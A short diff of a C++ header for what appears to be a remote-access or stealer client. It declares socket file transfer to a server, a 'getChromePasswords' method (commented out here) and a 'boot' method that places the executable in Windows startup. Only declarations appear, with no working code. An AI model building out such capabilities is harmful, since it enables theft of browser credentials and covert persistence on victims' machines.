@@ -32,7 +32,6 @@ using namespace std;
 class Connection {
     string ip;
     int port;
-    //vector<filesystem::path> *files;
     SOCKET sock;
 
 
@@ -44,7 +43,7 @@ public:
     void sendFile(string path);
 
     //Getting file from the server and save it in path
-    void recvFile();
+    void recvFile(string path);
 
     //Sending data to the server
     void sendMessage(const char *data);
@@ -74,7 +73,7 @@ public:
     //Creating the connection
     void connection();
 
-    void getChromePasswords();
+    //void getChromePasswords();
 
     //Opening the exe file in windows startup
     int boot();
